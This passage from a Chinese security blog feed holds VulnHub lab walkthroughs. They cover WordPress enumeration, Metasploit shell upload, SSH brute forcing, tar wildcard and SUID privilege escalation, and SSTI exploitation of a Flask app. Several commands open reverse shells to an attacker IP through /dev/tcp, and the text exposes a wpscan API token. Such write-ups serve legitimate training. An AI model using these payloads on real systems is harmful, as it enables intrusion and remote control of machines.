xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1096.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.80 靶机开放端口 22,80,139,445,3306,8081</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODA=\">http://192.168.31.80</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1097.png\" width=\"520\" alt=\"Image\">\n<p>审查源代码，找到一则提示信息，展示了一个用户名和密码  <code>john:y0uC@n'tbr3akIT</code>  并且告知了此网站是 wp 的，即是 wordpres 站点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1098.png\" width=\"620\" alt=\"Image\">\n<p>既然是 wordpress 站点，我就直接用 wpscan 工具来扫描一波<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.80 -e</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1099.png\" width=\"620\" alt=\"Image\">\n<p>居然说是没有 wp，那可能是误导我们或者 wp 站点在其他的目录里。对网站进行 gobuster 扫描，识别一下网站有什么目录没有</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1100.png\" width=\"700\" alt=\"Image\">\n<p>发现没有，按照 wp 的规范，后台地址是 wp-admin, 我们直接进该目录，发现这个站点确实不存在 wp，可能在其他的目录或者站点里边</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1101.png\" width=\"520\" alt=\"Image\">\n<p>还有一个 8081 的站点也是网站，点进来看看有没有啥敏感信息，发现进到这个页面之后会跳转</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1102.png\" width=\"520\" alt=\"Image\">\n<p>跳转到了一个站点，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctcTMzZXI4b2YyenMxcThza2Vwai5sb296LmNvbQ==\">站点的域名是 www.looz.com</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1103.png\" width=\"520\" alt=\"Image\">\n<p>修改本地的 hosts 文件，将站点 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sb296LmNvbQ==\">www.looz.com</span> 的 DNS 解析指向靶机 ip</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1104.png\" width=\"350\" alt=\"Image\">\n<p>尝试一下一直寻找的 wp 站点是不是就在这个 url 地址上，直接在域名后面拼接一个 wp-admin 找后台登陆地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1105.png\" width=\"580\" alt=\"Image\">\n<p>找到后台地址后凭借我们在前面收集到的用户信息登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1106.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"wordpress-渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#wordpress-渗透测试\">#</a> wordpress 渗透测试</h3>\n<p>一眼看到网站是 wordpress 6.0.1 的，直接用本地的 searchsploit 寻找是否存在此版本的 wordpress 的漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1107.png\" width=\"480\" alt=\"Image\">\n<p>这个版本没有很明显的提权漏洞，只能另想其他方法了，既然是 wp 站点，索性在继续用 wpsan 扫描，枚举用户名</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1108.png\" width=\"620\" alt=\"Image\">\n<p>wpscan 扫描出了以下几个用户名 john,william,james,evelyn,mason,harper,gandalf</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1109.png\" width=\"520\" alt=\"Image\">\n<p>继续用 wpsan 枚举属于这几个用户名的密码<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://wp.looz.com/ -U john,william,james,evelyn,mason,harper,gandalf - P /usr/share/wordlists/rockyou.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1110.png\" width=\"520\" alt=\"Image\">\n<p>最终得到了用户 gandalf 的密码 loveme2,</p>\n<h3 id=\"wp_admin_shell_upload-使用\"><a class=\"markdownIt-Anchor\" href=\"#wp_admin_shell_upload-使用\">#</a> wp_admin_shell_upload 使用</h3>\n<p>目前得到了 wp 站点的两组账号，在 msf 中有一个 wp_admin_shell_upload 的模块，可根据已有账号反弹 shell，用这两个模块尝试反弹 shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class=\"line\">set password loveme2</span><br><span class=\"line\">set rhosts wp.looz.com</span><br><span class=\"line\">set username gandalf</span><br><span class=\"line\">set targeturi /</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1111.png\" width=\"580\" alt=\"Image\">\n<p>很遗憾，gandalf 用户反弹是失败的，继续用 john 用户测试该站点</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class=\"line\">set password y0uC@n\\&#x27;tbr3akIT</span><br><span class=\"line\">set rhosts wp.looz.com</span><br><span class=\"line\">set username john</span><br><span class=\"line\">set targeturi /</span><br><span class=\"line\">set password y0uC@n\\&#x27;tbr3akIT</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>注意 msf 中使用单引号时需要在其前面加反斜杠转义</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1112.png\" width=\"580\" alt=\"Image\">\n<p>但是仍然没有 shell 反弹出来，目前我们知道的仍然只是两组用户，还没有利用价值</p>\n<h3 id=\"dig-判断站点\"><a class=\"markdownIt-Anchor\" href=\"#dig-判断站点\">#</a> dig 判断站点</h3>\n<p>判断一下网站是否存在其他的站点  <code>dig wp.looz.com @192.168.31.80</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1113.png\" width=\"420\" alt=\"Image\">\n<p>很遗憾也没有其他站点，接下来可以看看后台怎么用，有没有可以操作的地方，找到一个可以上传文件的地方，我们直接上传 php 木马看有没有效果</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1114.png\" width=\"620\" alt=\"Image\">\n<p>很遗憾，这个地方也上传失败了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1115.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"密码破解\"><a class=\"markdownIt-Anchor\" href=\"#密码破解\">#</a> 密码破解</h3>\n<p>接下来就需要爆破了，爆破用户名和密码，用户名可以选用前期通过 wpscan 得到的几个用户名，密码选用一个比较全的字典。</p>\n<p><code>hydra -l gandalf -P /usr/share/wordlists/rockyou.txt 192.168.31.80 ssh -t 64 -f -vV -o hydra.ssh</code></p>\n<p>要是自己破解不知道要破解到猴年马月，而且在实际测试中受制于防守方部署的 IDS、IPS 我们没法使用 hydra 暴力测试，这里我看了相关作者的文档，利用 gandalf 进行了破解密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1116.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 得到 gandalf 的密码 highschoolmusical</p>\n<p><code>ssh 192.168.31.80 -l gandalf</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1117.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"suid-提权\"><a class=\"markdownIt-Anchor\" href=\"#suid-提权\">#</a> suid 提权</h3>\n<p>拿到服务器后，搜索到了一个 s 权限的文件  <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1118.png\" width=\"470\" alt=\"Image\">\n<p>用 strings 检查了一下并没有发现封装什么特殊的命令，可能是作者自己封装的一个命令，没有头绪怎么处理这个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1119.png\" width=\"520\" alt=\"Image\">\n<p>既然是可执行文件，就去执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1120.png\" width=\"460\" alt=\"Image\">\n<p>-&gt; 拿到了 root 的 shell</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/138%20BLUESOMKE/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/138%20BLUESOMKE/",
            "title": "VULNHUB 38 BLUESOMKE",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZXNtb2tlLWRldnJhbmRvbTIsNjc4Lw==\">https://www.vulnhub.com/entry/bluesmoke-devrandom2,678/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly92aXNoYWwtY2hhbmRhay5tZWRpdW0uY29tL3Z1bG5odWItYmx1ZXNtb2tlLWRldnJhbmRvbTItd3JpdGUtdXAtYTY2OWU3MzgyYmEw\">https://vishal-chandak.medium.com/vulnhub-bluesmoke-devrandom2-write-up-a669e7382ba0</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 BLUESOMKE：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1014.png\">\n<p>-&gt; 靶机 ip:192.168.31.84 靶机开放端口 22,80</p>\n<h3 id=\"tar-通配符提权\"><a class=\"markdownIt-Anchor\" href=\"#tar-通配符提权\">#</a> tar 通配符提权</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODQ=\">http://192.168.31.84</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1015.png\">\n<p>对方服务器会执行我们上传的 tar 文件，通过上传恶意 tar 文件反弹 shell</p>\n<p>准备反弹 shell 的 <span class=\"exturl\" data-url=\"aHR0cDovL2V4cC5zaA==\">exp.sh</span> 文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; exp.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.78/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1016.png\" width=\"388\" alt=\"Image\">\n<p>这里的 ip 我做了别名并且加入到了环境变量里边，对 ifconfig 的结果做了过滤，所以有这么一个奇怪的命令</p>\n<p>tar 通配符提权如下，对方去使用 tar 的时候会执行我们的 exp.sh 从而将 shell 反弹出来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh exp.sh&quot;</span><br><span class=\"line\">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class=\"line\">tar -cf tar_shell.tar ./*</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">--checkpoint[=NUMBER]每第 NUMBER 条记录显示进度消息（默认为 10 ）</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">--checkpoint-action=ACTION在每个检查点上执行 ACTION</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1017.png\" width=\"540\" alt=\"Image\">\n<p>将 exp.sh 上传到网站上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1018.png\" width=\"620\" alt=\"Image\">\n<p>上传成功后，没多长时间我们就接受到了反弹的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1019.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"定时任务查看\"><a class=\"markdownIt-Anchor\" href=\"#定时任务查看\">#</a> 定时任务查看</h3>\n<p>将接受到的 shell 变成一个标准的 shell 终端</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1020.png\" width=\"560\" alt=\"Image\">\n<p>查看计划任务看是什么情况造成这个漏洞的</p>\n<p>crontab -l | tail -n 1</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1021.png\" width=\"520\" alt=\"Image\">\n<p>可见靶机上有 tar -cvf 的压缩命令的定时任务被定期执行</p>\n<h3 id=\"ssh私钥密码破解\"><a class=\"markdownIt-Anchor\" href=\"#ssh私钥密码破解\">#</a> ssh 私钥密码破解</h3>\n<blockquote>\n<p>收集服务器的相关信息，如 id 查看用户组，查看 linux 的版本，查看 pkexec 是否存在，上传 pspy 监控，上传 linpeas 监控服务器上的敏感信息，寻找服务器的权限设置错误，查找 s 权限的文件，看有无端口敲门漏洞，看端口信息是否可做隧道，脏牛提权，敏感的配置文件信息，定时任务等</p>\n</blockquote>\n<p>对上述做了全面信息收集后，并没有找到可利用的点，继续找，找到了 ssh 配对的信息，可以尝试利用此 ssh 私钥连接到其他用户。 <code>cat ~/.ssh/id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1022.png\" width=\"650\" alt=\"Image\">\n<p>看到这个 ssh 私钥文件内容比正常无密码的 ssh 要多一点，怀疑有密钥上有一层密码，需要通过相关工具来破解出密钥的密码。</p>\n<p>查看靶机上总共有哪几个用户  <code>cat /etc/passwd | grep bash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1023.png\" width=\"440\" alt=\"Image\">\n<p>我们就是要用这个私钥文件分别配对四个用户进行免密登陆</p>\n<p>将私钥文件发送至我们的 kali 攻击机 <code>scp id_rsa parallels@192.168.31.78:/tmp/tmp</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1024.png\" width=\"590\" alt=\"Image\">\n<p>尝试用此私钥登陆对方服务器时  <code>ssh -i id_rsa backupper@192.168.31.84</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1025.png\" width=\"520\" alt=\"Image\">\n<p>提醒我们需要输入密码，破解 ssh 私钥的密码首先想到的就是 john 工具<br>\n先用 ssh2john 将私钥文件转化为 john 可识别的文件  <code>ssh2john id_rsa &gt; id_rsa_hash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1026.png\" width=\"700\" alt=\"Image\">\n<p>再用 john 去破解私钥的 hash 文件 <code>john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1027.png\" width=\"520\" alt=\"Image\">\n<p>没有爆破出来，这个 john 工具出现了问题，干脆删了它，重新编译一个 john</p>\n<h3 id=\"源码编译-john\"><a class=\"markdownIt-Anchor\" href=\"#源码编译-john\">#</a> 源码编译 john</h3>\n<p>并不知道 john 是以何种方式安装的，可以尝试打印其路径，删除其二进制文件，或者先用 apt 源尝试卸载 john  <code>sudo apt remove john</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1028.png\" width=\"520\" alt=\"Image\">\n<p>看来就是通过 apt 源中下载的 john，将其卸载干净之后，再次输入 john 的命令，判断出来此服务器目前没有了此命令</p>\n<p>下一步就是通过源码编译 john:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4=\">https://github.com/openwall/john</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1029.png\" width=\"620\" alt=\"Image\">\n<p><code>wget https://github.com/openwall/john/archive/refs/tags/1.9.0-Jumbo-1.zip</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1030.png\" width=\"580\" alt=\"Image\">\n<p><code>cd john-1.9.0-Jumbo-1</code>  在 src 文件夹下配置： <code>./configure</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1031.png\" width=\"540\" alt=\"Image\">\n<p>同一文件下使用 make 命令编译</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1032.png\">\n<p>在 run 文件夹下使用:  <code>./john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1033.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 破解得到 ssh 私钥文件的密码是 samantha1</p>\n<p>将我们编译成功的 john 配置到全局，以软连接的方式强制放到 /usr/bin/john<br>\n <code>sudo ln -sf ~/Desktop/redteam/john/john-1.9.0-Jumbo-1/run/john /usr/bin/john</code></p>\n<blockquote>\n<p>-s 表示添加软连接，-f 表示强制添加，第一个位置是原位置，第二个位置是添加了软连接之后的位置</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1034.png\" width=\"700\" alt=\"Image\">\n<p>输入 john 之后可以看到此命令已经变成全局命令了</p>\n<h3 id=\"用户组权限利用\"><a class=\"markdownIt-Anchor\" href=\"#用户组权限利用\">#</a> 用户组权限利用</h3>\n<p>凭借私钥及其密码 samantha1 依次尝试前面得到服务器四个有 bash 的用户登陆，最终凭借 jaap 用户登录到了服务器 <code>ssh jaap@192.168.31.84 - i id_isa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1035.png\" width=\"580\" alt=\"Image\">\n<blockquote>\n<p>拿到 jaap 的权限之后，我们同样是没有一些通用的提权方式提权的，需要翻阅文件，看靶机设计者给了我们哪些文件</p>\n</blockquote>\n<p>找到主目录下有两个敏感文件，一个 s 权限的 find 命令，另一个是 startserver.sh 的脚本，</p>\n<p><code>ls -Alh</code>  看到 find 属于 jaap 用户和 remnie 用户组<br>\n remnie 权限使用 find 提权  <code>sudo -u remnie ./find. -exec /bin/bash -p \\; -quit</code> <br>\n 没 sudo，用 jaap 来执行从而拿 remnie 的用户组权限  <code>./find. -exec /bin/sh -p \\; -quit</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1036.png\" width=\"590\" alt=\"Image\">\n<p>有了 remnie 的用户组权限，就可以进入到其用户目录下</p>\n<h3 id=\"shell脚本漏洞\"><a class=\"markdownIt-Anchor\" href=\"#shell脚本漏洞\">#</a> shell 脚本漏洞</h3>\n<p>查看到有段提示说是在本地的某个端口处有一些问题</p>\n<blockquote>\n<p>查看到 scripts 中的 start.sh 中有一些代码：使用 /tmp/start 创建一个变量文件名，如果文件开始在那里，将使用 ps 命令从进程运行的 grep 形式的 <span class=\"exturl\" data-url=\"aHR0cDovL3NlcnZlci5weQ==\">server.py</span>，如果 <span class=\"exturl\" data-url=\"aHR0cDovL3NlcnZlci5weQ==\">server.py</span> 没有运行，它将运行它，如果是，则它会回显该消息。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1037.png\" width=\"480\" alt=\"Image\">\n<p>查看一下当前有哪些端口在运行，记录一下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1038.png\" width=\"620\" alt=\"Image\">\n<p>上传 pspy 监控，发现的确没有 server.py 被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1039.png\" width=\"700\" alt=\"Image\">\n<p>于是我们接下来就需要去操作得到 /tmp/start 这个文件，记得之前在 jaap 用户中找到过一个 startserver.sh 的文件，去看一看这个文件，这个文件就是用来将 1 输入到 /tmp/start 中的，之后看 pspy 监控</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1040.png\" width=\"400\" alt=\"Image\">\n<p>Pspy 中监听到了 remnie 用户下的 start.sh 执行了，判断出此时靶机上的某个端口被打开了，看一看目前开放的端口有哪些</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1041.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 此时本地端口 8787 成功被打开了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1042.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"curl-测试内网站点\"><a class=\"markdownIt-Anchor\" href=\"#curl-测试内网站点\">#</a> curl 测试内网站点</h3>\n<p>服务器上有 curl 命令，用 curl 测试得到是一个网站，但是服务器不存在 iptables 命令，无法将 8787 端口外放，意外着外界无法访问到此端口，这时候就需要做 ssh 的端口转发</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1043.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"ssh-端口转发\"><a class=\"markdownIt-Anchor\" href=\"#ssh-端口转发\">#</a> ssh 端口转发</h3>\n<blockquote>\n<p>ssh 端口转发就是将我们访问某一个 ip:port 的流量转发至另一个 ip:port，如下，在此我的公网 ip 地址中存在一个网站，想要通过 ssh 端口转发，将我本地访问 localhost 的某一个端口的流量转发至这个页面</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1044.png\" width=\"620\" alt=\"Image\">\n<blockquote>\n<p>判断本地的 7001 端口并没有被占用  <code>lsof -i:7001 </code> <br>\n将访问本地 7000 端口的信息转发到远程主机的 80 端口上面  <code>ssh -p 2121 -L 7000:localhost:80 root@1.117.52.219 -i /etc/ssh/cloud.pem -N</code> <br>\n-p 表示进入服务器的端口，-L 表示转发规则，前者为本地端口，后者为远程端口，-i 指定私钥文件进行免密，-N 表示不进入服务器</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1045.png\" width=\"620\" alt=\"Image\">\n<p>于是，我们访问本地的 7001 端口便可以进入到公网上的页面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1046.png\" width=\"620\" alt=\"Image\">\n<blockquote>\n<p>假如远程主机在 9888 端口部署了一个服务器，但是防火墙并没有开放这个端口，如果本地想要访问这个 9888 ，就可以用上面的案例来绕过防火墙进行 ssh 访问。</p>\n</blockquote>\n<p>可以使用 nohup 进行后台运行 <code>nohup ssh -p2121 -L 7001:localhost:80 root@1.117.52.219 -i /etc/ssh/cloud.pem -N &amp;</code> <br>\n 使用一句话命令直接清理本地的 7001 端口 <code>lsof -i: 7001 | awk '&#123;print $2&#125;' | grep -v 'PID' | uniq | xargs kill - 9</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1047.png\" width=\"700\" alt=\"Image\">\n<p>nohup 无日志产生的后台运行如下  <code>nohup java -jar ruoyi-admin.jar &gt;/dev/null 2&gt;&amp;1 &amp;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1048.png\" width=\"700\" alt=\"Image\">\n<p>我们通过端口转发来将我们本地访问 8787 端口时进入到靶机的 8787 界面，从而绕过防火墙规则，靶机上需要确定开放了 8787</p>\n<p>在我们的主机上执行:  <code>ssh -L 8787:127.0.0.1:8787 -i id_rsa jaap@192.168.31. 85 -N</code> <br>\n 于是我门主机打开 8787 的页面就进入到了靶机对应的窗口中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1049.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 接下来转变为对这个端口所在的 web 的测试</p>\n<h3 id=\"ssh-内网穿透\"><a class=\"markdownIt-Anchor\" href=\"#ssh-内网穿透\">#</a> ssh 内网穿透</h3>\n<p>既然提到了 ssh 的端口转发，不得不说一下 ssh 的内网穿透可以将内网的服务穿透到公网上去，</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">实现如下</span></span><br><span class=\"line\">`user1 mac: lsof -i:1122`</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将指定user2 的 1122 端口连接到user1 的 22 端口,-R表示远程端口转发，-N表示不执行，-f后台运行</span></span><br><span class=\"line\">`user2 kali: ssh -Nf -R *:1122:localhost:22 chentuo@192.168.31.19`</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">user3通过连接user1的 1122 端口连接到了user2上</span></span><br><span class=\"line\">user3 windows: ssh -p 1122 parallels@192.168.31.19</span><br></pre></td></tr></table></figure>\n<p>下图中从上至下分别表示 mac，kali，windows 三个机器</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1050.png\" width=\"660\" alt=\"Image\">\n<p>即 user1 相当于一个公网跳板，一个内网的机器连接这个跳板就可以连接到另外一个内网的机器，user3 连接到公网跳板的流量被转发到了另一台内网机器</p>\n<h3 id=\"ssti反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#ssti反弹shell\">#</a> SSTI 反弹 shell</h3>\n<p>打开 127.0.0.1:8787 开始测试网站漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1051.png\" width=\"560\" alt=\"Image\">\n<p>是 flask 框架，测试 SSTI 模板注入  <code>http://127.0.0.1:8787/?name=&#123;&#123;10*10&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1052.png\" width=\"400\" alt=\"Image\">\n<p>回显是计算结果，表示存在此模板注入，利用 SSTI 模板注入在反弹 shell 到 kali 机器上</p>\n<p><code>http://127.0.0.1:8787/?name=&#123;% import os %&#125;&#123;&#123;os.system('bash -c \"bash -i >&/dev/tcp/192.168.31.83/4444 >&1\"')&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1053.png\" width=\"650\" alt=\"Image\">\n<p>反弹失败可能是采用了过滤机制</p>\n<h3 id=\"ssti-失败绕过\"><a class=\"markdownIt-Anchor\" href=\"#ssti-失败绕过\">#</a> SSTI 失败绕过</h3>\n<p>利用 url 编码绕过过滤机制，<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc29ucy5jbi91cmxlbmNvZGU=\">http://www.jsons.cn/urlencode</span> 上进行 url 编码转化</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1054.png\" width=\"520\" alt=\"Image\">\n<p>将上述中用来反弹 shell 的代码进行 url 编码后得到如下网址</p>\n<p><code>http://127.0.0.1:8787/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.83%2F4444%20%3E%261%22')%7D%7D</code></p>\n<p>继续访问此网站用来反弹 shell，依然是无效果的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1055.png\" width=\"520\" alt=\"Image\">\n<p>换种方式来执行，在对方服务器上写一个 sh 的反弹脚本，利用 SSTI 去读取这个脚本并执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; /tmp/shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash - c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.83/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1056.png\" width=\"700\" alt=\"Image\">\n<p>访问如下网址用另外的方式来反弹 shell</p>\n<p><code>http://127.0.0.1:8787/?name=&#123;&#123;request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cd%20/tmp/;bash%20shell.sh%27).read()&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1057.png\" width=\"700\" alt=\"Image\">\n<p>反弹虽然成功了，但却立即断开了，原因不明，将机器重新启动后，shell 成功被反弹出来，接收到了一个稳定的 shell, 将所得到的 shell 利用如下三行代码输出为标准的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1058.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 现在我们成功拿到了 remnie 用户的 shell</p>\n<h3 id=\"二进制数据解密\"><a class=\"markdownIt-Anchor\" href=\"#二进制数据解密\">#</a> 二进制数据解密</h3>\n<p>remnie 用户下的 server.py 文件就是形成此漏洞的原因</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1059.png\" width=\"700\" alt=\"Image\">\n<p>我们现在仍然在一个既没有内核漏洞可以提权，也没有相关权限设置错误提权的机器上，只能寻找于 remnie 相关的文件来找突破口，看到用户主目录下有一个 server.conf 的配置文件，进行查看之后看到了如下信息。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1060.png\" width=\"520\" alt=\"Image\">\n<p>提示说是一个连接 root 服务的文件，最右边的这些二进制数字比较可疑，尝试进行二进制解密</p>\n<p>将这些二进制数字打印出来  <code>cat server.conf | cut -d '|' -f 2 &gt; binary.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1061.png\" width=\"570\" alt=\"Image\">\n<p>Vim 不进入写模式将换行符换为空  